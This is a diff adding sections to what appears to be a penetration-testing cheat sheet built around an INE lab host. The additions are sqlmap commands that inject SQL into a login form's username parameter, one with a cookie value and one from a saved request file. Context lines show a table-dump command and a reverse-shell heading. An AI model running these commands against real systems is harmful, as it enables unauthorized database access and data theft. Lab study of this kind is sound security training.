@@ -162,6 +162,19 @@ sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&p
 ```shell
 sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&password=ss&login-php-submit-button=Login" -p username --banner -D database --dump -T table --threads 10
 ```
+## Setting cookie values
+
+```bash
+sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&password=ss&login-php-submit-button=Login" -p username --banner --current-db --threads 10 --cookie="cookie=value"
+```
+
+The cookie parameter can be filled with the HTTP Cookie header value from valid requests.
+
+## Using a saved request
+
+```shell
+sqlmap -r req.txt -p parameter
+```
 
 # Simple Linux reverse shell
 
